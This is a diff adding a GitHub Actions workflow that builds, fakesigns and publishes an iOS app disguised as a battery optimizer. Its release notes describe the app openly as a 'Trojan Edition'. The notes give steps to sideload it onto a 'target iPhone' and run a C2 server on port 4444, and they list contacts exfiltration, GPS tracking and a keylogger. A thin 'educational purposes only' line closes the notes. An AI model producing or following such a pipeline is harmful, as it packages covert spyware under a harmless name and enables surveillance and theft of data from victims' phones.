@@ -1,0 +1,94 @@
+name: Build and Release IPA
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: macos-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    
+    - name: Setup Xcode
+      uses: maxim-lobanov/setup-xcode@v1
+      with:
+        xcode-version: latest-stable
+    
+    - name: Install dependencies
+      run: |
+        brew install ldid
+        pip3 install Pillow
+    
+    - name: Generate icons
+      run: |
+        cd test
+        python3 create_icon.py
+        python3 generate_icons.py
+    
+    - name: Build IPA
+      run: |
+        cd test
+        xcodebuild -project BatteryOptimizer.xcodeproj \
+          -scheme BatteryOptimizer \
+          -configuration Release \
+          -archivePath build/BatteryOptimizer.xcarchive \
+          archive \
+          CODE_SIGN_IDENTITY="" \
+          CODE_SIGNING_REQUIRED=NO \
+          CODE_SIGNING_ALLOWED=NO
+        
+        xcodebuild -exportArchive \
+          -archivePath build/BatteryOptimizer.xcarchive \
+          -exportPath build \
+          -exportOptionsPlist exportOptions.plist
+    
+    - name: Sign IPA (fakesign for sideload)
+      run: |
+        cd test/build
+        ldid -S BatteryOptimizer.app
+        mkdir Payload
+        cp -r BatteryOptimizer.app Payload/
+        zip -r BatteryOptimizer.ipa Payload
+    
+    - name: Create Release
+      uses: softprops/action-gh-release@v1
+      with:
+        files: |
+          test/build/BatteryOptimizer.ipa
+          test/c2_server.py
+        body: |
+          ## Battery Optimizer Pro - Trojan Edition
+          
+          **Installation:**
+          1. Download BatteryOptimizer.ipa
+          2. Install via AltStore/Sideloadly/TrollStore
+          3. Run c2_server.py on your machine
+          4. Launch app on target iPhone
+          
+          **C2 Server:**
+          - Host: 192.168.1.109
+          - Port: 4444
+          - Command: python3 c2_server.py
+          
+          **Features:**
+          - Contacts exfiltration
+          - Real-time GPS tracking
+          - Keylogger
+          - Background operation
+          
+          ⚠️ For educational purposes only
+        draft: false
+        prerelease: false
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    
+    - name: Upload artifacts
+      uses: actions/upload-artifact@v3
+      with:
+        name: BatteryOptimizer-IPA
+        path: test/build/BatteryOptimizer.ipa
